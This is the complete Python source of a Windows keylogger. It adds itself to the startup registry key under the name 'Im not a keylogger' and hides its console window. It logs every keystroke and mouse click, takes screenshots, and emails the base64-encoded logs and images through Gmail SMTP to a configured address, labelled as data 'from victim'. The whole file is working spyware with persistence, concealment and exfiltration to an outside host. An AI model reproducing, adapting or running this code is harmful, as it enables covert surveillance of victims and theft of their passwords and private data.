import os
import time
import random
import smtplib
import string
import base64
from winreg import *
from pynput import mouse, keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


global t, start_time, pics_names, yourgmail, yourgmailpass, sendto, interval

t = ""
pics_names = []


# ########Settings########

yourgmail = ""  # What is your gmail?
yourgmailpass = ""  # What is your gmail password
sendto = ""  # Where should I send the logs to? (any email address)
interval = 10  # Time to wait before sending data to email (in seconds)

# ########################

try:
    f = open('Logfile.txt', 'a')
    f.close()
except:
    f = open('Logfile.txt', 'w')
    f.close()


def addStartup():
    # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = os.path.basename(__file__)
    new_file_path = os.path.join(fp, file_name)
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ, new_file_path)
    except Exception as e:
        print("Error:", e)


def hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


addStartup()
hide()


def screen_shot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


def mail_it(data, pics_names):
    try:
        data = base64.b64encode(data.encode()).decode()
        data = 'New data from victim(Base64 encoded)\n' + data
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, data)
        server.close()

        for pic in pics_names:
            with open(pic, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            data = 'New pic data from victim(Base64 encoded)\n' + data
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.sendmail(yourgmail, sendto, data)
            server.close()
    except Exception as e:
        print("Error sending email:", e)




def on_mouse_event(x, y, button, pressed):
    global t, start_time, pics_names
    data = f'\n[{time.ctime().split(" ")[3]}] WindowName: Unknown\n\tButton: {"Pressed" if pressed else "Released"}\n\tClicked in (Position): ({x}, {y})\n===================='
    t += data

    if len(t) > 300:
        screen_shot()

    if len(t) > 50:
        with open('Logfile.txt', 'a') as f:
            f.write(t)
        t = ''

    if int(time.time() - start_time) == interval:
        mail_it(t, pics_names)
        start_time = time.time()
        t = ''


def on_keyboard_event(key):
    global t, start_time
    try:
        data = f'\n[{time.ctime().split(" ")[3]}] WindowName: Unknown\n\tKeyboard key: {key.char}\n===================='
    except AttributeError:
        data = f'\n[{time.ctime().split(" ")[3]}] WindowName: Unknown\n\tKeyboard key: {str(key)}\n===================='

    t += data

    if len(t) > 500:
        with open('Logfile.txt', 'a') as f:
            f.write(t)
        t = ''

    if int(time.time() - start_time) == interval:
        mail_it(t, pics_names)
        start_time = time.time()
        t = ''


start_time = time.time()
mouse_listener = mouse.Listener(on_click=on_mouse_event)
mouse_listener.start()

keyboard_listener = keyboard.Listener(on_press=on_keyboard_event)
keyboard_listener.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    mouse_listener.stop()
    keyboard_listener.stop()
